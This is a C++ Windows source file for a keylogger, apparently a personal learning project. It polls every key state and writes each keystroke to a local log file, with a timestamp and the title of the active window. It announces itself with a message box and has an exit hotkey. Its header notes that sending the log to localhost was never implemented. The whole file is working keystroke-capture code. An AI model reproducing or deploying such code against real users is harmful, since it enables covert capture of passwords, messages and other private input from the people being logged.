/*
Key Logger Program
- Captures keystrokes and sends the data over localhost

Needed:
- Capture A-Z, a-z										*
- Capture special keys like Shift and Backspace			*
- Record time of each keypress							*
- Record active window?									*
- Transmit to localhost									X - Need to read up a lot more on cpp libraries that can handle this.
															Found some potential in winhttp.h, but I didn't understand it enough
															to use it in good conscience
*/

// Included libraries
#include <Windows.h>
#include <fstream>
#include <string>
#include <chrono>
#include <ctime>

using namespace std;

// Function Declaration
int errorWindow(string);
void LogKeystroke(ofstream&, int);

int WinMain(
	HINSTANCE	hInstance,
	HINSTANCE	hPrevInstance,
	LPSTR		lpCmdLine,
	int			nShowCmd
) {
	//Open file
	ofstream file("KeyLogResults.txt");
	if (!file.is_open()) {
		return errorWindow("Failed to open log file");
	}

	//Inform user on start
	MessageBoxA(0, "Press Ctrl+Shift+Q to kill keylogger", "", MB_OK);

	//Main loop
	while (true) {
		//Get Keystroke
		for (int i = 0; i < 256; i++) {
			if (GetAsyncKeyState(i) & 0b1) LogKeystroke(file, i);
		}

		//Exit Mechanism
		if (
			GetAsyncKeyState(VK_CONTROL) &&
			GetAsyncKeyState(VK_SHIFT) &&
			GetAsyncKeyState('Q')
			)
		{
			MessageBoxA(0, "Keylogger is closed", "", MB_OK);
			break;
		}
	}

	//Close program
	file.close();
	ShellExecuteA(NULL, "open", "KeyLogResults.txt", NULL, NULL, SW_SHOW);
	return 0;
}

// Error function which informs user of the error
int errorWindow(string error) {
	string message = "An error has occurred. This program will now terminate:\n" + error;
	MessageBoxA(0, message.c_str(), "", MB_OK);
	return -1;
};

// Function that translates keypress and logs it into file
void LogKeystroke(ofstream& file, int key) {

	string fileString = "";

	switch (key) {
	case VK_SPACE:
		fileString += " \n";
		break;
	case VK_BACK:
		fileString += "[Backspace]\n";
		break;
	case VK_TAB:
		fileString += "[Tab]\n";
		break;
	case VK_RETURN:
		fileString += "[Enter]\n";
		break;
	case 0x30:
		if (GetAsyncKeyState(VK_SHIFT) & 0x8000) fileString = ")\n";
		else fileString += "0\n";
		break;
	case 0x31:
		if (GetAsyncKeyState(VK_SHIFT) & 0x8000) fileString = "!\n";
		else fileString += "1\n";
		break;
	case 0x32:
		if (GetAsyncKeyState(VK_SHIFT) & 0x8000) fileString = "@\n";
		else fileString += "2\n";
		break;
	case 0x33:
		if (GetAsyncKeyState(VK_SHIFT) & 0x8000) fileString = "#\n";
		else fileString += "3\n";
		break;
	case 0x34:
		if (GetAsyncKeyState(VK_SHIFT) & 0x8000) fileString = "$\n";
		else fileString += "4\n";
		break;
	case 0x35:
		if (GetAsyncKeyState(VK_SHIFT) & 0x8000) fileString += "%\n";
		else fileString += "5\n";
		break;
	case 0x36:
		if (GetAsyncKeyState(VK_SHIFT) & 0x8000) fileString += "^\n";
		else fileString += "6\n";
		break;
	case 0x37:
		if (GetAsyncKeyState(VK_SHIFT) & 0x8000) fileString += "&\n";
		else fileString += "7\n";
		break;
	case 0x38:
		if (GetAsyncKeyState(VK_SHIFT) & 0x8000) fileString += "*\n";
		else fileString += "8\n";
		break;
	case 0x39:
		if (GetAsyncKeyState(VK_SHIFT) & 0x8000) fileString += "(\n";
		else fileString += "9\n";
		break;
	case VK_OEM_1:
		if (GetAsyncKeyState(VK_SHIFT) & 0x8000) fileString += ":\n";
		else fileString += ";\n";
		break;
	case VK_OEM_2:
		if (GetAsyncKeyState(VK_SHIFT) & 0x8000) fileString += "?\n";
		else fileString += "/\n";
		break;
	case VK_OEM_3:
		if (GetAsyncKeyState(VK_SHIFT) & 0x8000) fileString += "~\n";
		else fileString += "`\n";
		break;
	case VK_OEM_4:
		if (GetAsyncKeyState(VK_SHIFT) & 0x8000) fileString += "{\n";
		else fileString += "[\n";
		break;
	case VK_OEM_5:
		if (GetAsyncKeyState(VK_SHIFT) & 0x8000) fileString += "|\n";
		else fileString += "\\\n";
		break;
	case VK_OEM_6:
		if (GetAsyncKeyState(VK_SHIFT) & 0x8000) fileString += "}\n";
		else fileString += "]\n";
		break;
	case VK_OEM_7:
		if (GetAsyncKeyState(VK_SHIFT) & 0x8000) fileString += "\"\n";
		else fileString += "'\n";
		break;
	default:
		//Top row num keys no longer handled in default case, but I'm too lazy to remove
		if ((key >= 0x30 && key <= 0x39) || (key >= 0x60 && key <= 0x69)) {
			if (key > 0x39) {
				fileString += (char)(key - 0x30);
			}
			else fileString += (char)key;
			fileString += '\n';
		}
		else if (key >= 0x41 && key <= 0x5A) {
			if (GetAsyncKeyState(VK_SHIFT) & 0x8000) fileString += (char)key;
			else fileString += (char)tolower((char)key);
			fileString += '\n';
		}
		break;
	}

	if (!fileString.empty()) {
		//Grab current time
		auto tempTime = chrono::system_clock::now();
		auto legacyTime = chrono::system_clock::to_time_t(tempTime);
		char time[128];
		ctime_s(time, sizeof(time), &legacyTime);
		time[strlen(time) - 1] = '\0';
		file << "\n[" << time << "]\n";

		//Grab current window
		char windowTitle[256];
		HWND activeWindow = GetForegroundWindow();
		GetWindowTextA(activeWindow, windowTitle, sizeof(windowTitle));
		file << "[Window: " << windowTitle << "]\n";

		//Save string to file
		file << fileString;
	}
}